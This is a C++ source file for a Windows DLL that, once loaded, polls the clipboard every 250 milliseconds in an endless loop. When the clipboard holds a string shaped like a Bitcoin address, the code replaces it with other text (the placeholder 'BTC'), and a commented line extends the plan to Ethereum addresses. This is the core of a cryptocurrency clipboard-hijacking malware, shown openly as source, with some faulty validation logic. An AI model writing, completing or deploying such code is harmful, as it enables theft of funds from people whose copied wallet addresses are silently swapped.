#include "main.h"

void DLL_EXPORT setClip(LPCSTR text){
    if (OpenClipboard(0)){
        EmptyClipboard();
        char *hBuff = (char*)GlobalAlloc(GMEM_FIXED, strlen(text) + 1);
        strcpy(hBuff, text);
        SetClipboardData(CF_TEXT, hBuff);
        CloseClipboard();
    }
}

bool isBTC(LPCSTR reg){
    if(strlen(reg)<27 || strlen(reg)>43){return false;}
    if(!(reg[0]=='b' && reg[1]=='c' && reg[2]=='1')){}else{goto next_label;}
    if(reg[0]!='1'){}else{goto next_label;}
    if(reg[0]!='3'){return false;}else{goto next_label;}
    next_label:
        LPCSTR symbols = "abcdefghijklmnopqrstuvwxyzABCDFFGHJKLMNPQRSTUVWXYZ0123456789";
        int sym = 0, num = 0, cont = 0;
        for(sym=0;sym<(int)strlen(reg);sym++){
            for(num=0;num<(int)strlen(symbols);num++){
                if(reg[sym]==symbols[num]){cont++;}
            }
            if(cont>0){cont = 0;continue;}else{return false;}
        }
    return true;//^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$
}

LPCSTR DLL_EXPORT getClip(){
    if (OpenClipboard(0)){
        HANDLE hData = GetClipboardData(CF_TEXT);
        LPCSTR txt = (char*)GlobalLock(hData);
        GlobalUnlock(hData);
        CloseClipboard();
        return txt;
    }
    return NULL;
}

void DLL_EXPORT loop(){
    start:
        try{
            if (isBTC(getClip())) {setClip("BTC");}
            //if (regCrypto("/^0x[a-fA-F0-9]{40}$/"))                {setClip("ETH");}
            Sleep(250);
        }catch (int x){goto start;}
    goto start;
}

extern "C" DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
    switch (fdwReason){
        case DLL_PROCESS_ATTACH:
            // attach to process
            // return FALSE to fail DLL load
            loop();
            break;

        case DLL_PROCESS_DETACH:
            // detach from process
            break;

        case DLL_THREAD_ATTACH:
            // attach to thread
            loop();
            break;

        case DLL_THREAD_DETACH:
            // detach from thread
            break;
    }
    return TRUE; // succesful
}
